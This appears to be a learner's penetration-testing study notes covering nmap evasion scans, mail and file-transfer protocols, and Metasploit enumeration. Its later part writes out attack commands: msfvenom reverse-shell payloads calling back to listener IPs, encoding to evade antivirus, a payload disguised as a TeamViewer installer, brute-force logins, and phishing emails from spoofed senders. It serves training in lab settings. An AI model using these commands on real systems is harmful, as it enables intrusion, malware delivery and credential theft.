Custom TCP Scan              sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.3.241
Spoofed Source IP            sudo nmap -S SPOOFED_IP 10.10.3.241
Spoofed MAC Address          --spoof-mac SPOOFED_MAC
Decoy Scan 	             nmap -D DECOY_IP,ME 10.10.3.241
Idle (Zombie) Scan           sudo nmap -sI ZOMBIE_IP 10.10.3.241
Fragment IP data into 8 bytes 	-f
Fragment IP data into 16 bytes 	-ff
Option 	Purpose

--source-port PORT_NUM
	specify source port number

--data-length NUM
	append random data to reach given length

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.
Option 	Purpose
--reason 	explains how Nmap made its conclusion
-v 	verbose
-vv 	very verbose
-d 	debugging
-dd 	more details for debugging
-=-=-=-=-=-==-=
Service Detection

Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.

It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.

-=-=-=
OS detection and traceroute 
-O 
The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.

Traceroute

If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

t is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses

-=-=-=
Nmap scripting engine (NSE)

You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.
Script Category 	Description
auth 	                Authentication related scripts
broadcast 	        Discover hosts by sending broadcast messages
brute 	                Performs brute-force password auditing against logins
default 	        Default scripts, same as -sC
discovery 	        Retrieve accessible information, such as database tables and DNS names
dos 	                Detects servers vulnerable to Denial of Service (DoS)
exploit 	        Attempts to exploit various vulnerable services
external 	        Checks using a third-party service, such as Geoplugin and Virustotal
fuzzer 	                Launch fuzzing attacks
intrusive 	        Intrusive scripts such as brute-force attacks and exploitation
malware 	        Scans for backdoors
safe 	                Safe scripts that won’t crash the target
version 	        Retrieve service versions
vuln 	                Checks for vulnerabilities or exploit vulnerable services

=-=-=-
Option 	Meaning
-sV 	determine service/version info on open ports
-sV --version-light 	try the most likely probes (2)
-sV --version-all 	try all available probes (9)
-O 	detect OS
--traceroute 	run traceroute to target
--script=SCRIPTS 	Nmap scripts to run
-sC or --script=default 	run default scripts
-A 	equivalent to -sV -O -sC --traceroute
-oN 	save output in normal format
-oG 	save output in grepable format
-oX 	save output in XML format
-oA 	save output in normal, XML and Grepable formats
-=-=-=-=-=-=
Protocols and servers 

The $ indicates that this is not a root terminal.
FTP
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

    Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
    Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.

The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH

FTPS uses multiple ports and needs a secondary data channel which makes using firewalls more difficult. On the other hand, SFTP uses a single connection between the client and the server and so it is more firewall-friendly
-=-=
#STMP
Email delivery over the Internet requires the following components:

    Mail Submission Agent (MSA)
    Mail Transfer Agent (MTA)
    Mail Delivery Agent (MDA)
    Mail User Agent (MUA)


These are the following five steps that an email needs to go through to reach the recipient’s inbox:

    A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
    The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
    The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
    A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
    The recipient will collect its email from the MDA using their email client.

If the above steps sound confusing, consider the following analogy:

    You (MUA) want to send postal mail.
    The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
    The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
    The post office (MTA) delivers the mail to the recipient mailbox (MDA).
    The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.

In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:

    Simple Mail Transfer Protocol (SMTP)
    Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)

We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.

SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.

-=-=-=-=
POP3 

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.

First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.


In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.

Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.


-=-=-==
IMAP 
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.

Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST "" "*", before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.


-=-=-==-=-=-=-=-=-=-=-=-=-=-=

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

    Sniffing Attack (Network Packet Capture)
    Man-in-the-Middle (MITM) Attack
    Password Attack (Authentication Attack)
    Vulnerabilities

Attacking protocols and servers
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.

Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alternation, and Destruction (DAD)

-=-=-=
Sniffing attack
We would consider the following
    Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
    Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
    Tshark is a CLI alternative to Wireshark.

Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.

We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A


-=-=-==-
SSL/TLS

The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.

Protocol 	Default Port 	Secured Protocol 	Default Port with TLS
HTTP 	        80 	        HTTPS 	                443
FTP     	21      	FTPS            	990
SMTP     	25      	SMTPS            	465
POP3     	110      	POP3S            	995
IMAP     	143      	IMAPS            	993

Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:

    Establish a TCP connection with the remote web server
    Send HTTP requests to the web server, such as GET and POST requests.

HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:

    Establish a TCP connection
    Establish SSL/TLS connection
    Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server.


After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:

    The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
    The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
    The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
    The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.

If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.

Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.

As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.

we can see the following information:

    To whom is the certificate issued? That is the name of the company that will use this certificate.
    Who issued the certificate? This is the certificate authority that issued this certificate.
    Validity period. You don’t want to use a certificate that has expired, for instance.

Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.


-=-=-==
SSH
To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:

    A username and a password
    A private and public key (after the SSH server is configured to recognize the corresponding public key)


--=-=
Summary 
Protocol 	TCP Port 	Application(s) 	                Data Security
FTP 	        21 	        File Transfer 	                Cleartext
FTPS 	        990 	        File Transfer 	                Encrypted
HTTP 	        80 	        Worldwide Web 	                Cleartext
HTTPS 	        443 	        Worldwide Web 	                Encrypted
IMAP 	        143 	        Email (MDA) 	                Cleartext
IMAPS 	        993 	        Email (MDA) 	                Encrypted
POP3 	        110 	        Email (MDA) 	                Cleartext
POP3S 	        995 	        Email (MDA) 	                Encrypted
SFTP 	        22 	        File Transfer 	                Encrypted
SSH 	        22 	        Remote Access and File Transfer Encrypted
SMTP 	        25 	        Email (MTA) 	                Cleartext
SMTPS 	        465 	        Email (MTA) 	                Encrypted
Telnet 	        23 	        Remote Access 	                Cleartext




Vulnerability	Description
Operating System
	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based
	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials
	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic
	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor
	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

-=-=-=-=
'The Metasploit Framework'
  5.1 Overview
    MSF Architecture
      Interfaces: MSFconsole, MSFcli, Armitage & Web
      Modules: 
        exploit, 
        payload:
          > It is an advanced multi-functional paylaod that is executed in memory on the target system making it difficult to detect. It is not downloaded to the target system or is not executed on disk. As a result, no traces of the payload are left or are found on the target system
	  Staged payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp.

	Stageless payloads do not have a stage.   Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads => (https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
          Stageless (or Non-Staged payload): Payload that is sent to the taget system as is along with the exploit
          Staged payload : It is sent to the target in two parts whereby:
            Stagers: Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system
            Stage: Payload components that are downloaded by the stager
		> Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another. This will look like it is all pressed together for a stageless payload. Take our example linux/zarch/meterpreter_reverse_tcp. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. For one last quick example of this naming convention, consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp. The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.

        encoder(For example, shikata_ga_nai is used to encode Windows payloads)
        NOPS(Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed)
        auxiliary
      Libraries: Rex, MSF Core & MSF Base
      
    MSF module locations
      MSF stores modules under the following directory
        /usr/share/metasploit-framework/modules
      User specified modules are stored here:
        ~/.ms5/modules

    Starting
      msfdb run
        db_status
   MSFconsole fundamentals
    version
    show -h
      show all // Show all modules
      show exploits 
    search portscan
      use auxiliary/scanner/portscan/tcp 
      (Once you have used it) back
    search -h
      search cve:2017 type:exploit platform:-windows
      search cve:2017 type:exploit platform:+windows
      search eternalblue
    sessions
    connect -h 
      connect 192.168.188.126 80

  Creating and managin workspaces
    workspace -h
      workspace
      hosts
      workspace -a Test
      workspace 
      workspace default
      workspace INE
      workspace -d Test //delete
      workspace -r INE PTA //rename

  Information Gathering & Enumeration
    Port scanning & enumeration with nmap
      nmap -Pn -sV -O 10.2.33.173 -oX windows_server_2012_results
      Importing nmap scan results into msf
        service postresql start
        msfconsole
          db_status
          workspace -a Win2k12
            db_import /root/windows_server_2012_results
            hosts //The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions.
            services //The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
            loot //The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
            creds //The creds command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.
          workspace -a Nmap_MSF
            db_nmap -Pn -sV -O 10.2.33.173 
            vulns
        > After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. To do so, use the db_export command.
            msf6 > db_export -f xml backup.xml

        > Using Plugins

            + To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. Navigating to /usr/share/metasploit-framework/plugins, which is the default directory for every new installation of msfconsole, should show us which plugins we have to our availability:
                m1l0js@htb[/htb]$ ls /usr/share/metasploit-framework/plugins
            + If the plugin is found here, we can fire it up inside msfconsole and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:
                msf6 > load nessus

        > Installing new plugins
            + For example, let us try installing DarkOperator's Metasploit-Plugins(https://github.com/darkoperator/Metasploit-Plugins.git). Then, following the link above, we get a couple of Ruby (.rb) files which we can directly place in the folder mentioned above.
                m1l0js@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
                m1l0js@htb[/htb]$ ls Metasploit-Plugins
            + Here we can take the plugin pentest.rb as an example and copy it to /usr/share/metasploit-framework/plugins.
                MSF - Copying Plugin to MSF
                    m1l0js@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
            + Afterward, launch msfconsole and check the plugin's installation by running the load command. After the plugin has been loaded, the help menu at the msfconsole is automatically extended by additional functions.
                MSF - Load Plugin
                    m1l0js@htb[/htb]$ msfconsole -q
                    msf6 > load pentest
            + Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below:
                		
nMap (pre-installed)	        NexPose (pre-installed)	    Nessus (pre-installed)
Mimikatz (pre-installed V.1)	Stdapi (pre-installed)	    Railgun
Priv	                        Incognito (pre-installed)	Darkoperator's

https://nmap.org/
https://sectools.org/tool/nexpose/
https://www.tenable.com/products/nessus
http://blog.gentilkiwi.com/mimikatz
https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi
https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation
https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb
https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
https://github.com/darkoperator/Metasploit-Plugins

[+] Mixins
    + The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes msfconsole excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.
    + Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:
    +     Want to provide a lot of optional features for a class.
    +     Want to use one particular feature for a multitude of classes.
    + Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word include, to which we pass the name of the module as a parameter. We can read more about mixins here => (https://en.wikibooks.org/wiki/Metasploit/UsingMixins)
    + If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.




    Port scanning with auxiliary modules //Ideal for pivoting
      msfconsole
        search portscan
          use auxiliary/scanner/portscan/tcp
        //Once we have gained a meterpreter session
          meterpreter > run autoroute -s 192.112.57.2 //The IP on the other interface of the first target machine
        //BG this session and run portscan against the new target (192.112.57.3)
          Bash Script:
          #!/bin/bash
          for port in {1..1000}; do
          timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
          done)
      FTP enumeration
        search portscan
          use auxiliary/scanner/portscan/tcp
        search ftp type:auxiliary
          use auxiliary/scanner/ftp/ftp_version
            [Manually: nc -vn 192.19.87.3]
            searchsploit the version
          use auxiliary/scanner/ftp/ftp_login //brute force 
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
            set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
          use auxiliary/scanner/ftp/anonymous
            
      SMB enumeration
        setg RHOSTS 192.91.46.3
        search type:auxiliary smb
        use auxiliary/scanner/smb/smb_version
        use auxiliary/scanner/smb/smb_enumshares
          set showfiles true
        use auxiliary/scanner/smb/smb_login
          set smbuser admin
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 

      Web Server enumeration
        search type:auxiliary http
        use auxiliary/scanner/http/http_version
        use auxiliary/scanner/http/http_header
        use auxiliary/scanner/http/http_put
          set filename test.txt
          set filedad "Welcome"
        use auxiliary/scanner/http/http_login
        use auxiliary/scanner/http/robots_txt
        use auxiliary/scanner/http/dir_scanner
        use auxiliary/scanner/http/brute_dirs
        use auxiliary/scanner/http/dir_listing
        use auxiliary/scanner/http/files_dir
          set auth_uri /secure/ //The directory target
          unset userpass_file for not be equal to user_file
        use auxiliary/scanner/http/apache_userdir_enum

      MySQL enumeration
        search type:auxiliary mysql
        use auxiliary/scanner/mysql/mysql_version
        use auxiliary/scanner/mysql/mysql_login
          set username root
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
        use auxiliary/scanner/mysql/mysql_enum
        use auxiliary/scanner/mysql/mysql_sql //To execute commands
        use auxiliary/scanner/mysql/mysql_file_enum
          set file_list /usr/share/metasploit-framework/data/wordlists/directory.txt
        use auxiliary/scanner/mysql/mysql_hashdump
        use auxiliary/scanner/mysql/mysql_schemadump
        use auxiliary/scanner/mysql/msyql_writable_dirs

      SSH enumeration
        workspace -a SSH_enum
        search type:auxiliary name:ssh
        use auxiliary/scanner/ssh
          ssh_version
          ssh_login //Password authentication
            set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
          ssh_login_pubkey //Key based authentication
          ssh_enumusers

      SMTP enumeration (SPF,DKIM & DMARC) => https://mxtoolbox.com/dmarc/details/what-is-a-dmarc-record
        search type:auxiliary name:smtp
        use auxiliary/scanner/stmp
          smtp_version
          smtp_enum
        manually
          ismtp
            ismtp -h 192.22.47.3 -e /mydic.txt
          sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
          swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
          smtp-user-enum
            smtp-user-enum -M VRFY -U footprinting-wordlist.txt -m 1 -D inlanefreight.htb -t 10.129.60.147 -t 10 -v

  Vulnerability scanning
    service postgresql start
    msfconsole -q
      db_status
      workspace -a MS3
      db_nmap -sS -sV -O 10.10.10.4
      hosts
      services
      search type:exploit name:Microsoft IIS

      
      analyze 
      vulns
    //If we would like to import Nessus results
        db_import /home/MS3_fkthix.nessus
        vulns -p445
        search cve:2017 name:smb or another different would be search cve:2012 name:rdp
    > You can use https://github.com/hahwul/metasploit-autopwn
      msfconsole -q
        load db_autopwn(Deprecated but it still works. Manual installation)
        db_autopwn -p -t -PI 445
    WMAP(web application vulnerability scanner)
      available as an MSF plugin and can be loadad directly in MSF
      load wmap
        wmap_sites -a 192.157.89.3
        wmap_targets -t http://192.157.89.3
        wmap_sites -l //Available sites
        wmap_targets -l //Available targets
        wmap_run -t //All the modules that will be used
        wmap_run -e //Run it
        wmap_vulns -l
      use auxiliary/scanner/http/options
      use auxiliary/scanner/http/http_put
        set PATH /data

  Client-side attacks
    Generating payloads with Msfvenom
      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
      msfvenom --list payloads
      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe
      msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx64.exe
      msfvenom --list formats //List valid executable formats 
      msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx86
      msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx64
        elf //Linux binary

        How to transfer this files?
          sudo python -m SimpleHttpServer 80
        
        We await from a connection back //Example
          msfconsole -q 
           set payload linux/x86/meterpreter/reverse_tcp
           use exploit/multi/handler 
	> Another example of create a stageless payload
		msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
    Encoding payloads with Msfvenom
        > They are also needed to remove hexadecimal opcodes known as bad characters from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

        > Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (仕方がない) means It cannot be helped or Nothing can be done about it, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. This article from FireEye(https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.
      We can evade older signature based AV solutions by encoding our payloads.

        [+] Selecting an Encoder

            > Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called msfpayload and msfencode. These two tools are located in /usr/share/framework2/.
            > If we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.
                m1l0js@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
            > After 2015, updates to these scripts have combined them within the msfvenom tool, which takes care of payload generation and Encoding. We will be talking about msfvenom in detail later on. Below is an example of what payload generation would look like with today's msfvenom and without encoding
                #Generating Payload - Without Encoding
                m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
            > We should now look at the first line of the $buf and see how it changes when applying an encoder like shikata_ga_nai. 
                #Generating Payload - With Encoding
                m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
            > If we want to look at the functioning of the shikata_ga_nai encoder, we can look at an excellent post here.(https://hatching.io/blog/metasploit-payloads2/)
            > Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.
            
            > For example, let us try the MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit.
                + Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:
                    m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
                + This will generate a payload with the exe format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.

                + One better option would be to try running it through multiple iterations of the same Encoding scheme:
                    m1l0js@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
                + As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
                    m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe


      msfvenom --list encoders
        x86/shikata_ga_nai
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe
